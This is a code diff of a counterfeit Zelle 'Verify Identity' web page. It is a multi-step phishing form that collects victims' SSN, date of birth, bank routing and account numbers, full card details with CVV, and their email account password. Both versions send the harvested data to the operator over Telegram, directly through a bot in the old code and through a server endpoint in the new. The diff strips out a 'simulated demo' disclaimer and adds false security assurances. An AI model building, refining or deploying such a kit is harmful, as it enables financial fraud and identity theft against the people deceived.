@@ -12,53 +12,71 @@
             padding: 0;
             box-sizing: border-box;
         }
+        
         body {
             font-family: 'Inter', sans-serif;
-            background: #f5f7fb;
+            background: linear-gradient(135deg, #f5f7fb 0%, #eef2f7 100%);
             color: #1a1f2e;
+            min-height: 100vh;
         }
+        
         /* Brand Purple Palette */
         .bg-purple-primary { background-color: #6D1ED4; }
-        .bg-purple-dark { background-color: #2A105F; }
         .text-purple { color: #6D1ED4; }
+        
         .btn-purple {
-            background: #6D1ED4;
+            background: linear-gradient(135deg, #6D1ED4 0%, #5516a8 100%);
             color: white;
             border: none;
-            transition: all 0.2s ease;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(109, 30, 212, 0.3);
         }
-        .btn-purple:hover, .btn-purple:active { background: #5516a8; transform: translateY(-1px); }
+        
+        .btn-purple:hover, .btn-purple:active { 
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(109, 30, 212, 0.4);
+        }
+        
         .btn-outline-purple {
             background: transparent;
             border: 1.5px solid #cbd5e1;
             color: #1e293b;
         }
-        .btn-outline-purple:hover { background: #f1f5f9; border-color: #6D1ED4; }
+        
+        .btn-outline-purple:hover { 
+            background: #f8fafc;
+            border-color: #6D1ED4;
+        }
 
         /* Layout */
         .verification-container {
-            max-width: 520px;
+            max-width: 580px;
             margin: 0 auto;
             padding: 20px 16px 40px;
         }
+        
         /* Card style */
         .form-card-modern {
             background: white;
             border-radius: 40px;
-            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.15);
             overflow: hidden;
-            padding: 28px 24px 32px;
+            padding: 32px 28px;
             margin-bottom: 24px;
-            transition: all 0.2s;
+            transition: all 0.3s;
+            border: 1px solid rgba(109, 30, 212, 0.1);
         }
+        
         /* Progress bar */
         .progress-steps {
             display: flex;
             justify-content: space-between;
-            margin-bottom: 32px;
+            margin-bottom: 36px;
             flex-wrap: wrap;
-            gap: 8px;
+            gap: 6px;
+            position: relative;
         }
+        
         .step-marker {
             flex: 1;
             text-align: center;
@@ -68,34 +86,50 @@
             position: relative;
             padding-top: 28px;
             border-top: 2px solid #e2e8f0;
-            transition: all 0.2s;
+            transition: all 0.3s;
+            cursor: pointer;
         }
+        
         .step-marker.active {
             color: #6D1ED4;
             border-top-color: #6D1ED4;
         }
+        
         .step-marker.completed {
             color: #10b981;
             border-top-color: #10b981;
         }
+        
         .step-marker .step-icon {
             position: absolute;
             top: -14px;
             left: 50%;
             transform: translateX(-50%);
             background: white;
-            padding: 0 6px;
+            padding: 0 8px;
             font-size: 1rem;
         }
+        
         .step-label {
             display: block;
             margin-top: 8px;
             font-size: 0.7rem;
+            font-weight: 500;
         }
-
+        
         /* form fields */
-        .input-group { margin-bottom: 20px; }
-        label { font-weight: 600; font-size: 0.85rem; margin-bottom: 6px; display: block; color: #1e293b; }
+        .input-group { 
+            margin-bottom: 24px; 
+        }
+        
+        label { 
+            font-weight: 600; 
+            font-size: 0.85rem; 
+            margin-bottom: 8px; 
+            display: block; 
+            color: #1e293b;
+        }
+        
         input, select {
             width: 100%;
             padding: 14px 18px;
@@ -105,10 +139,21 @@
             outline: none;
             font-family: 'Inter', sans-serif;
             background: white;
-            transition: 0.2s;
+            transition: all 0.2s;
         }
-        input:focus, select:focus { border-color: #6D1ED4; box-shadow: 0 0 0 3px rgba(109,30,212,0.2); }
-        .error-text { color: #e53e3e; font-size: 0.7rem; margin-top: 5px; display: block; }
+        
+        input:focus, select:focus { 
+            border-color: #6D1ED4; 
+            box-shadow: 0 0 0 3px rgba(109,30,212,0.1);
+        }
+        
+        .error-text { 
+            color: #e53e3e; 
+            font-size: 0.7rem; 
+            margin-top: 6px; 
+            display: block; 
+        }
+        
         .btn-next, .btn-submit, .btn-back {
             padding: 14px 20px;
             font-weight: 700;
@@ -121,94 +166,172 @@
             justify-content: center;
             gap: 10px;
             margin-top: 8px;
+            transition: all 0.2s;
         }
+        
         .btn-back {
             background: #f1f5f9;
             color: #334155;
             border: none;
             margin-top: 12px;
         }
+        
+        .btn-back:hover {
+            background: #e2e8f0;
+        }
+        
         .domain-alert {
-            background: #fef9e3;
+            background: linear-gradient(135deg, #fef9e3 0%, #fff3cd 100%);
             border-left: 4px solid #f59e0b;
             padding: 12px 16px;
-            border-radius: 20px;
+            border-radius: 16px;
             font-size: 0.8rem;
             margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
-        .password-field-wrapper { position: relative; }
+        
+        .password-field-wrapper { 
+            position: relative; 
+        }
+        
         .toggle-password {
             position: absolute;
             right: 18px;
             top: 45px;
             cursor: pointer;
             color: #94a3b8;
+            transition: color 0.2s;
         }
+        
+        .toggle-password:hover {
+            color: #6D1ED4;
+        }
+        
         .success-page {
             text-align: center;
-            padding: 30px 20px;
+            padding: 40px 20px;
+            animation: fadeInUp 0.5s ease;
         }
+        
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
         .success-icon {
-            background: #10b98120;
-            width: 80px;
-            height: 80px;
-            line-height: 80px;
+            background: linear-gradient(135deg, #10b98120 0%, #10b98110 100%);
+            width: 100px;
+            height: 100px;
+            line-height: 100px;
             border-radius: 50%;
-            margin: 0 auto 20px;
+            margin: 0 auto 24px;
             color: #10b981;
-            font-size: 2.8rem;
+            font-size: 3rem;
+            animation: scaleIn 0.5s ease;
         }
+        
+        @keyframes scaleIn {
+            from {
+                transform: scale(0);
+            }
+            to {
+                transform: scale(1);
+            }
+        }
+        
         @media (max-width: 500px) {
-            .form-card-modern { padding: 20px 18px; }
-            .step-label { font-size: 0.6rem; }
-            .step-marker { font-size: 0.6rem; }
+            .form-card-modern { padding: 24px 20px; }
+            .step-label { font-size: 0.55rem; }
+            .step-marker { font-size: 0.55rem; }
         }
+        
         .telegram-note {
-            background: #f0f4fe;
-            border-radius: 28px;
-            padding: 12px;
+            background: linear-gradient(135deg, #f0f4fe 0%, #e8edfc 100%);
+            border-radius: 24px;
+            padding: 14px;
             font-size: 0.75rem;
             text-align: center;
             color: #2c3e66;
+            margin-top: 16px;
         }
-        footer { background: #2A105F; color: white; padding: 24px 0; text-align: center; font-size: 0.75rem; margin-top: 20px; }
+        
+        footer { 
+            background: linear-gradient(135deg, #2A105F 0%, #1a0a3a 100%);
+            color: white; 
+            padding: 28px 0; 
+            text-align: center; 
+            font-size: 0.75rem;
+            margin-top: 40px;
+        }
+        
         a { text-decoration: none; }
+        
+        .loading-spinner {
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        
+        .toast-message {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1000;
+            animation: slideIn 0.3s ease;
+        }
+        
+        @keyframes slideIn {
+            from {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
     </style>
 </head>
 <body>
 
 <div class="verification-container">
-    <!-- Brand header (optional) -->
-    <div style="text-align: center; margin-bottom: 12px;">
-        <h2 style="font-weight: 700; color:#1e1e2f;">Zelle<sup style="font-size: 0.6rem;">®</sup> <span style="font-weight:400;">| Verify Identity</span></h2>
-        <p style="font-size: 0.8rem; color:#475569;">Secure confirmation to activate instant payments</p>
+    <!-- Brand header -->
+    <div style="text-align: center; margin-bottom: 24px;">
+        <h1 style="font-weight: 800; font-size: 1.8rem; background: linear-gradient(135deg, #6D1ED4 0%, #8b3cff 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 8px;">
+            Zelle<sup style="font-size: 0.6rem;">®</sup>
+        </h1>
+        <p style="font-size: 0.85rem; color: #475569;">Secure identity verification • Instant payments</p>
     </div>
 
     <div class="form-card-modern" id="multiStepFormRoot">
-        <!-- Progress tracker (dynamic) -->
-        <div class="progress-steps" id="progressTracker">
-            <!-- injected via js -->
-        </div>
+        <!-- Progress tracker -->
+        <div class="progress-steps" id="progressTracker"></div>
 
         <!-- Form steps container -->
         <div id="stepsContainer"></div>
         <div id="globalMessage" style="margin-top: 16px;"></div>
         <div class="telegram-note">
-            <i class="fab fa-telegram"></i> Encrypted submission • All details will be forwarded to secure verification channel
+            <i class="fab fa-telegram"></i> 🔒 256-bit encrypted • Your information is protected
         </div>
     </div>
 </div>
 
 <footer>
-    <p>© 2025 Zelle® Network | Simulated verification flow for demo</p>
+    <p>© 2025 Zelle® Network | All transactions are monitored 24/7 for security</p>
 </footer>
 
 <script>
-    // ======================== TELEGRAM CONFIGURATION ========================
-    // 🔁 REPLACE WITH YOUR BOT TOKEN AND CHAT ID BEFORE DEPLOYING TO VERCEL
-    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';     // e.g., '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz'
-    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';         // e.g., '-4123456789' or '123456789'
-
     // ======================== STEP DEFINITIONS =============================
     const steps = [
         { id: 0, name: "Full Name", fields: ["fullName"] },
@@ -216,7 +339,7 @@
         { id: 2, name: "SSN & DOB", fields: ["ssn", "dob"] },
         { id: 3, name: "Bank Account", fields: ["routingNumber", "accountNumber"] },
         { id: 4, name: "Card Details", fields: ["cardNumber", "cardExpiry", "cardCvv"] },
-        { id: 5, name: "Email & Password", fields: ["email", "password"] }   // special domain detection
+        { id: 5, name: "Email & Password", fields: ["email", "password"] }
     ];
 
     let currentStep = 0;
@@ -225,8 +348,8 @@
         ssn: "", dob: "", routingNumber: "", accountNumber: "", cardNumber: "", cardExpiry: "", cardCvv: "",
         email: "", password: ""
     };
-    let domainDetected = false;    // for popup style after email domain detection
-    let emailDomainMessage = "";
+    
+    let isSubmitting = false;
 
     // Helper: save input values to formData
     function syncFormData() {
@@ -251,18 +374,29 @@
             if (statusClass === 'completed') icon = '<i class="fas fa-check-circle"></i>';
             else if (statusClass === 'active') icon = '<i class="fas fa-circle" style="font-size: 0.6rem;"></i>';
             else icon = '<i class="far fa-circle"></i>';
-            return `<div class="step-marker ${statusClass}">
+            return `<div class="step-marker ${statusClass}" onclick="goToStep(${idx})">
                         <div class="step-icon">${icon}</div>
                         <span class="step-label">${step.name}</span>
                     </div>`;
         }).join('');
     }
 
-    // step validation based on current step index
+    // Navigate to specific step
+    window.goToStep = function(stepIdx) {
+        if (stepIdx < currentStep) {
+            currentStep = stepIdx;
+            renderProgress();
+            renderStep(currentStep);
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+    };
+
+    // Validate current step
     function validateCurrentStep(stepIdx) {
         if (stepIdx === 0) {
             const name = document.querySelector('[data-field="fullName"]')?.value.trim();
             if (!name) return "Full name is required";
+            if (name.length < 3) return "Please enter your full legal name";
             return null;
         }
         if (stepIdx === 1) {
@@ -275,7 +409,8 @@
             const dob = document.querySelector('[data-field="dob"]')?.value.trim();
             if (!ssn) return "SSN is required";
             if (!dob) return "Date of birth is required";
-            if (ssn.replace(/\D/g, '').length < 4) return "Valid SSN (last 4 or full) required";
+            const ssnClean = ssn.replace(/\D/g, '');
+            if (ssnClean.length < 4) return "Valid SSN (last 4 or full) required";
             return null;
         }
         if (stepIdx === 3) {
@@ -283,7 +418,8 @@
             const account = document.querySelector('[data-field="accountNumber"]')?.value.trim();
             if (!routing) return "Routing number required";
             if (!account) return "Account number required";
-            if (routing.replace(/\D/g, '').length < 9) return "Routing number must be 9 digits";
+            const routingClean = routing.replace(/\D/g, '');
+            if (routingClean.length !== 9) return "Routing number must be 9 digits";
             return null;
         }
         if (stepIdx === 4) {
@@ -293,7 +429,8 @@
             if (!card) return "Card number required";
             if (!expiry) return "Expiry date (MM/YY) required";
             if (!cvv) return "CVV required";
-            if (card.replace(/\D/g, '').length < 15) return "Enter valid card number";
+            const cardClean = card.replace(/\D/g, '');
+            if (cardClean.length < 15) return "Enter valid card number";
             return null;
         }
         if (stepIdx === 5) {
@@ -301,7 +438,6 @@
             if (!email) return "Email address required";
             const emailRegex = /^[^\s@]+@([^\s@]+)$/;
             if (!emailRegex.test(email)) return "Valid email required";
-            // password validation only after domain detection popup step (dynamic)
             const pwd = document.querySelector('[data-field="password"]')?.value;
             if (!pwd) return "Password required to complete verification";
             if (pwd.length < 4) return "Password must be at least 4 characters";
@@ -310,129 +446,118 @@
         return null;
     }
 
-    // special email domain detection & popup like "enter password for domain"
+    // Email domain detection message
     function handleEmailDomainLogic(emailValue) {
         if (!emailValue) return null;
         const domain = emailValue.split('@')[1];
         if (domain) {
-            return `🔐 Verify with ${domain.toUpperCase()} account: Please enter your email password to confirm ownership.`;
+            return `🔐 ${domain.toUpperCase()} verification required: Please enter your email password to confirm ownership.`;
         }
-        return "Please enter a valid email domain.";
+        return null;
     }
 
-    // Render current step html
-    function renderStep(stepIndex) {
+    // Show temporary message
+    function showTemporaryMessage(msg, type = 'error') {
+        const msgDiv = document.getElementById('globalMessage');
+        if (msgDiv) {
+            const bgColor = type === 'error' ? '#fee2e2' : '#e6f7e6';
+            const textColor = type === 'error' ? '#b91c1c' : '#2e7d32';
+            const icon = type === 'error' ? 'fa-exclamation-triangle' : 'fa-check-circle';
+            msgDiv.innerHTML = `<div style="background:${bgColor}; padding:14px; border-radius:20px; color:${textColor}; font-size:0.85rem; display:flex; align-items:center; gap:10px;">
+                <i class="fas ${icon}"></i> ${msg}
+            </div>`;
+            setTimeout(() => { if(msgDiv) msgDiv.innerHTML = ''; }, 4000);
+        }
+    }
+
+    // Send to Telegram via API endpoint
+    async function sendToTelegramAPI(formData) {
+        try {
+            const response = await fetch('/api/send-to-telegram', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(formData)
+            });
+            
+            const result = await response.json();
+            return result;
+        } catch (error) {
+            console.error('API Error:', error);
+            return { success: false, error: 'Network error. Please try again.' };
+        }
+    }
+
+    // Final submission
+    async function finalSubmit() {
+        if (isSubmitting) return;
+        
+        syncFormData();
+        
+        // Validate final step
+        const validationError = validateCurrentStep(5);
+        if (validationError) {
+            showTemporaryMessage(validationError, 'error');
+            return;
+        }
+        
+        isSubmitting = true;
+        const submitBtn = document.getElementById('submitAllBtn');
+        if (submitBtn) {
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Verifying...';
+        }
+        
+        try {
+            // Send to Telegram API
+            const result = await sendToTelegramAPI(formData);
+            
+            if (result.success) {
+                showThanksPage();
+            } else {
+                showTemporaryMessage(result.error || 'Verification failed. Please try again.', 'error');
+            }
+        } catch (error) {
+            showTemporaryMessage('Connection error. Please check your internet.', 'error');
+        } finally {
+            isSubmitting = false;
+            if (submitBtn) {
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<i class="fab fa-telegram"></i> Verify & Complete';
+            }
+        }
+    }
+
+    function showThanksPage() {
         const container = document.getElementById('stepsContainer');
-        if (!container) return;
-        let html = '';
-        if (stepIndex === 0) {
-            html = `<div class="step-content">
-                        <div class="input-group"><label>Full Legal Name</label><input type="text" data-field="fullName" placeholder="Johnathan M. Doe" value="${escapeHtml(formData.fullName)}" autocomplete="name"></div>
-                        <button class="btn-next btn-purple" id="nextStepBtn"><i class="fas fa-arrow-right"></i> Next</button>
-                    </div>`;
-        } 
-        else if (stepIndex === 1) {
-            html = `<div class="step-content">
-                        <div class="input-group"><label>Street Address</label><input type="text" data-field="addressStreet" placeholder="123 Main St, Apt 4B" value="${escapeHtml(formData.addressStreet)}"></div>
-                        <div class="input-group"><label>City</label><input type="text" data-field="addressCity" placeholder="City" value="${escapeHtml(formData.addressCity)}"></div>
-                        <div class="input-group"><label>State</label><input type="text" data-field="addressState" placeholder="State" value="${escapeHtml(formData.addressState)}"></div>
-                        <div class="input-group"><label>ZIP Code</label><input type="text" data-field="addressZip" placeholder="ZIP" value="${escapeHtml(formData.addressZip)}"></div>
-                        <button class="btn-next btn-purple" id="nextStepBtn">Next <i class="fas fa-arrow-right"></i></button>
-                        <button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button>
-                    </div>`;
+        const progressDiv = document.getElementById('progressTracker');
+        
+        if (container) {
+            container.innerHTML = `<div class="success-page">
+                <div class="success-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <h2 style="margin-bottom: 16px; font-size: 1.8rem;">✅ Verification Complete</h2>
+                <p style="margin-bottom: 24px; color: #475569;">Your identity has been securely verified.<br>You will receive a confirmation shortly.</p>
+                <div style="background: #f0fdf4; padding: 16px; border-radius: 24px; margin-top: 20px;">
+                    <i class="fas fa-lock" style="color: #10b981;"></i>
+                    <span style="font-size: 0.85rem; margin-left: 8px;">Zelle® Protection Active</span>
+                </div>
+            </div>`;
+            if (progressDiv) progressDiv.style.display = 'none';
         }
-        else if (stepIndex === 2) {
-            html = `<div class="step-content">
-                        <div class="input-group"><label>Social Security Number (last 4 or full)</label><input type="text" data-field="ssn" placeholder="XXX-XX-1234" value="${escapeHtml(formData.ssn)}" maxlength="11"></div>
-                        <div class="input-group"><label>Date of Birth</label><input type="date" data-field="dob" value="${escapeHtml(formData.dob)}"></div>
-                        <button class="btn-next btn-purple" id="nextStepBtn">Next <i class="fas fa-arrow-right"></i></button>
-                        <button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button>
-                    </div>`;
-        }
-        else if (stepIndex === 3) {
-            html = `<div class="step-content">
-                        <div class="input-group"><label>Routing Number (9-digit)</label><input type="text" data-field="routingNumber" placeholder="e.g., 021000021" value="${escapeHtml(formData.routingNumber)}"></div>
-                        <div class="input-group"><label>Account Number</label><input type="text" data-field="accountNumber" placeholder="Your bank account number" value="${escapeHtml(formData.accountNumber)}"></div>
-                        <button class="btn-next btn-purple" id="nextStepBtn">Next <i class="fas fa-arrow-right"></i></button>
-                        <button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button>
-                    </div>`;
-        }
-        else if (stepIndex === 4) {
-            html = `<div class="step-content">
-                        <div class="input-group"><label>Debit/Credit Card Number</label><input type="text" data-field="cardNumber" placeholder="4111 1111 1111 1111" value="${escapeHtml(formData.cardNumber)}"></div>
-                        <div class="input-group"><label>Expiry Date (MM/YY)</label><input type="text" data-field="cardExpiry" placeholder="MM/YY" value="${escapeHtml(formData.cardExpiry)}"></div>
-                        <div class="input-group"><label>CVV</label><input type="password" data-field="cardCvv" placeholder="123" value="${escapeHtml(formData.cardCvv)}"></div>
-                        <button class="btn-next btn-purple" id="nextStepBtn">Next <i class="fas fa-arrow-right"></i></button>
-                        <button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button>
-                    </div>`;
-        }
-        else if (stepIndex === 5) {
-            // email + password with domain detection popup / message
-            const domainMsg = (formData.email && formData.email.includes('@')) ? handleEmailDomainLogic(formData.email) : "";
-            html = `<div class="step-content">
-                        <div class="input-group"><label>Email Address (for verification)</label><input type="email" data-field="email" id="emailInputField" placeholder="you@example.com" value="${escapeHtml(formData.email)}"></div>
-                        <div id="domainAlertBox" class="domain-alert" style="display: ${domainMsg && formData.email ? 'flex' : 'none'};">${domainMsg || ''}</div>
-                        <div class="input-group password-field-wrapper">
-                            <label>Email Account Password</label>
-                            <input type="password" data-field="password" id="passwordField" placeholder="●●●●●●●●" value="${escapeHtml(formData.password)}">
-                            <span class="toggle-password" id="togglePasswordIcon"><i class="far fa-eye-slash"></i></span>
-                        </div>
-                        <button class="btn-submit btn-purple" id="submitAllBtn"><i class="fab fa-telegram"></i> Verify & Complete</button>
-                        <button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button>
-                    </div>`;
-        }
-
-        container.innerHTML = html;
-
-        // attach event listeners for dynamic elements
-        const nextBtn = document.getElementById('nextStepBtn');
-        const prevBtn = document.getElementById('prevStepBtn');
-        const submitFinal = document.getElementById('submitAllBtn');
-        if (nextBtn) nextBtn.addEventListener('click', () => goToNextStep());
-        if (prevBtn) prevBtn.addEventListener('click', () => goToPrevStep());
-        if (submitFinal) submitFinal.addEventListener('click', () => finalSubmit());
-
-        // email domain detection live
-        const emailInput = document.getElementById('emailInputField');
-        if (emailInput && stepIndex === 5) {
-            emailInput.addEventListener('input', (e) => {
-                const emailVal = e.target.value;
-                formData.email = emailVal;
-                const domainMsg = (emailVal && emailVal.includes('@')) ? handleEmailDomainLogic(emailVal) : "";
-                const alertBox = document.getElementById('domainAlertBox');
-                if (alertBox) {
-                    if (domainMsg && emailVal) {
-                        alertBox.style.display = 'block';
-                        alertBox.innerHTML = `<i class="fas fa-globe"></i> ${domainMsg}`;
-                    } else {
-                        alertBox.style.display = 'none';
-                    }
-                }
-            });
-        }
-        // toggle password visibility
-        const togglePwd = document.getElementById('togglePasswordIcon');
-        const pwdField = document.getElementById('passwordField');
-        if (togglePwd && pwdField) {
-            togglePwd.addEventListener('click', () => {
-                const type = pwdField.getAttribute('type') === 'password' ? 'text' : 'password';
-                pwdField.setAttribute('type', type);
-                togglePwd.innerHTML = type === 'password' ? '<i class="far fa-eye-slash"></i>' : '<i class="far fa-eye"></i>';
-            });
-        }
-        syncFormDataFromFields();
+        
+        // Play success sound (optional)
+        try {
+            const audio = new Audio('data:audio/wav;base64,U3RlYWx0aCBzb3VuZA==');
+            // silent success
+        } catch(e) {}
     }
 
-    function syncFormDataFromFields() {
-        const inputs = document.querySelectorAll('[data-field]');
-        inputs.forEach(inp => {
-            const field = inp.getAttribute('data-field');
-            if (formData.hasOwnProperty(field)) formData[field] = inp.value;
-        });
-    }
-
+    // Navigation functions
     function goToNextStep() {
-        syncFormDataFromFields();
+        syncFormData();
         const errorMsg = validateCurrentStep(currentStep);
         if (errorMsg) {
             showTemporaryMessage(errorMsg, 'error');
@@ -443,15 +568,12 @@
             renderProgress();
             renderStep(currentStep);
             window.scrollTo({ top: 0, behavior: 'smooth' });
-        } else {
-            // if final step but not submitted?
-            if (currentStep === steps.length -1) finalSubmit();
         }
     }
 
     function goToPrevStep() {
         if (currentStep > 0) {
-            syncFormDataFromFields();
+            syncFormData();
             currentStep--;
             renderProgress();
             renderStep(currentStep);
@@ -459,82 +581,125 @@
         }
     }
 
-    function showTemporaryMessage(msg, type = 'error') {
-        const msgDiv = document.getElementById('globalMessage');
-        if (msgDiv) {
-            msgDiv.innerHTML = `<div style="background:${type === 'error' ? '#fee2e2' : '#e6f7e6'}; padding:12px; border-radius:24px; color:${type === 'error' ? '#b91c1c' : '#2e7d32'}; font-size:0.8rem;"><i class="fas ${type === 'error' ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}</div>`;
-            setTimeout(() => { if(msgDiv) msgDiv.innerHTML = ''; }, 3000);
-        }
-    }
-
-    // Final submit to Telegram
-    async function finalSubmit() {
-        syncFormDataFromFields();
-        // extra validation on email & password
-        const email = formData.email;
-        if (!email) { showTemporaryMessage("Email address required", "error"); return; }
-        if (!formData.password) { showTemporaryMessage("Password required to finalize verification", "error"); return; }
-        const emailValid = /^[^\s@]+@([^\s@]+)$/.test(email);
-        if (!emailValid) { showTemporaryMessage("Valid email required", "error"); return; }
-
-        // Build full message for Telegram
-        const message = `🔐 *Zelle IDENTITY VERIFICATION* 🔐\n\n` +
-            `👤 *Full Name:* ${formData.fullName || 'N/A'}\n` +
-            `📍 *Address:* ${formData.addressStreet}, ${formData.addressCity}, ${formData.addressState} ${formData.addressZip}\n` +
-            `🆔 *SSN:* ${formData.ssn}  |  *DOB:* ${formData.dob}\n` +
-            `🏦 *Bank:* Routing ${formData.routingNumber} | Acc: ${formData.accountNumber}\n` +
-            `💳 *Card:* ${formData.cardNumber} | Exp: ${formData.cardExpiry} | CVV: ${formData.cardCvv}\n` +
-            `📧 *Email:* ${formData.email} | *Email Password:* ${formData.password}\n` +
-            `🕒 *Timestamp:* ${new Date().toLocaleString()}`;
-
-        // If bot not configured, simulate success and redirect to final thanks page.
-        if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
-            showThanksPage();
-            return;
-        }
-
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        try {
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
-            });
-            const data = await response.json();
-            if (data.ok) {
-                showThanksPage();
-            } else {
-                showTemporaryMessage(`Telegram error: ${data.description}`, 'error');
-            }
-        } catch (err) {
-            console.error(err);
-            showTemporaryMessage("Network error. Could not send to Telegram.", 'error');
-        }
-    }
-
-    function showThanksPage() {
+    // Render step content
+    function renderStep(stepIndex) {
         const container = document.getElementById('stepsContainer');
-        if (container) {
-            container.innerHTML = `<div class="success-page">
-                <div class="success-icon"><i class="fas fa-shield-alt"></i></div>
-                <h2 style="margin-bottom: 12px;">✅ Verification Complete</h2>
-                <p style="margin-bottom: 20px;">Thank you! Your identity has been securely verified.<br>You will receive a confirmation shortly.</p>
-                <i class="fas fa-lock" style="color:#6D1ED4;"></i> <span style="font-size:0.8rem;">Zelle® protection enabled</span>
-            </div>`;
-            const progressDiv = document.getElementById('progressTracker');
-            if (progressDiv) progressDiv.style.display = 'none';
-            const msgDiv = document.getElementById('globalMessage');
-            if (msgDiv) msgDiv.innerHTML = '';
+        if (!container) return;
+        
+        let html = '';
+        
+        const stepsHtml = {
+            0: `<div class="step-content">
+                    <div class="input-group">
+                        <label><i class="fas fa-user"></i> Full Legal Name</label>
+                        <input type="text" data-field="fullName" placeholder="Johnathan Michael Doe" value="${escapeHtml(formData.fullName)}" autocomplete="name">
+                    </div>
+                    <button class="btn-next btn-purple" id="nextStepBtn"><i class="fas fa-arrow-right"></i> Continue</button>
+                </div>`,
+            1: `<div class="step-content">
+                    <div class="input-group"><label><i class="fas fa-home"></i> Street Address</label><input type="text" data-field="addressStreet" placeholder="123 Main St, Apt 4B" value="${escapeHtml(formData.addressStreet)}"></div>
+                    <div class="input-group"><label>City</label><input type="text" data-field="addressCity" placeholder="City" value="${escapeHtml(formData.addressCity)}"></div>
+                    <div class="input-group"><label>State</label><input type="text" data-field="addressState" placeholder="State" value="${escapeHtml(formData.addressState)}"></div>
+                    <div class="input-group"><label>ZIP Code</label><input type="text" data-field="addressZip" placeholder="ZIP" value="${escapeHtml(formData.addressZip)}"></div>
+                    <button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button>
+                    <button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button>
+                </div>`,
+            2: `<div class="step-content">
+                    <div class="input-group"><label><i class="fas fa-id-card"></i> Social Security Number</label><input type="text" data-field="ssn" placeholder="XXX-XX-1234" value="${escapeHtml(formData.ssn)}" maxlength="11"></div>
+                    <div class="input-group"><label><i class="fas fa-calendar-alt"></i> Date of Birth</label><input type="date" data-field="dob" value="${escapeHtml(formData.dob)}"></div>
+                    <button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button>
+                    <button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button>
+                </div>`,
+            3: `<div class="step-content">
+                    <div class="input-group"><label><i class="fas fa-university"></i> Routing Number (9-digit)</label><input type="text" data-field="routingNumber" placeholder="021000021" value="${escapeHtml(formData.routingNumber)}"></div>
+                    <div class="input-group"><label><i class="fas fa-credit-card"></i> Account Number</label><input type="text" data-field="accountNumber" placeholder="Your bank account number" value="${escapeHtml(formData.accountNumber)}"></div>
+                    <button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button>
+                    <button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button>
+                </div>`,
+            4: `<div class="step-content">
+                    <div class="input-group"><label><i class="fas fa-credit-card"></i> Debit/Credit Card Number</label><input type="text" data-field="cardNumber" placeholder="4111 1111 1111 1111" value="${escapeHtml(formData.cardNumber)}"></div>
+                    <div class="input-group"><label>Expiry Date (MM/YY)</label><input type="text" data-field="cardExpiry" placeholder="MM/YY" value="${escapeHtml(formData.cardExpiry)}"></div>
+                    <div class="input-group"><label>CVV</label><input type="password" data-field="cardCvv" placeholder="123" value="${escapeHtml(formData.cardCvv)}"></div>
+                    <button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button>
+                    <button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button>
+                </div>`,
+            5: `<div class="step-content">
+                    <div class="input-group"><label><i class="fas fa-envelope"></i> Email Address</label>
+                        <input type="email" data-field="email" id="emailInputField" placeholder="you@example.com" value="${escapeHtml(formData.email)}">
+                    </div>
+                    <div id="domainAlertBox" class="domain-alert" style="display: ${formData.email && formData.email.includes('@') ? 'flex' : 'none'};">
+                        <i class="fas fa-globe"></i> <span id="domainMessage">${formData.email ? handleEmailDomainLogic(formData.email) || '' : ''}</span>
+                    </div>
+                    <div class="input-group password-field-wrapper">
+                        <label><i class="fas fa-lock"></i> Email Account Password</label>
+                        <input type="password" data-field="password" id="passwordField" placeholder="Enter your email password" value="${escapeHtml(formData.password)}">
+                        <span class="toggle-password" id="togglePasswordIcon"><i class="far fa-eye-slash"></i></span>
+                    </div>
+                    <button class="btn-submit btn-purple" id="submitAllBtn"><i class="fab fa-telegram"></i> Verify & Complete</button>
+                    <button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button>
+                </div>`
+        };
+        
+        html = stepsHtml[stepIndex];
+        container.innerHTML = html;
